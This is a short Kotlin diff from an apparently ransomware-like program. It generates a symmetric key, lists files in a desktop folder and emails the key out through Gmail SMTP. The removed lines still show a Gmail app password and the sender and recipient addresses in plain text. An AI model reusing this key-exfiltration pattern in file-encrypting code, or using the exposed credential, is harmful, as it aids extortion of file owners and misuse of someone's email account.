@@ -11,7 +11,8 @@ import javax.mail.internet.*
 import java.util.Properties
 
 fun main() {
-    val directorioEscritorio = "C:\\Users\\ayala\\OneDrive\\Escritorio\\prueba"
+    val directorioEscritorio = ""
+
     val clave = generarClaveSimetrica()
 
     val archivos = File(directorioEscritorio).listFiles()
@@ -84,9 +85,8 @@ fun convertirClaveDesdeBase64(base64: String): Key {
 fun enviarClavePorCorreo(clave: Key) {
     val claveBase64 = Base64.getEncoder().encodeToString(clave.encoded)
 
-    val correoDestino = "estenm2023@dominio.com"
-    val correoRemitente = "estenm2023@gmail.com"
-    val contraseñaCorreo = "tyor bfop bypm bjhi" //contraseña de aplicación
+    val correoDestino = "@dominio.com"
+    val correoRemitente = "@gmail.com"
 
     val propiedades = Properties().apply {
         put("mail.smtp.host", "smtp.gmail.com")
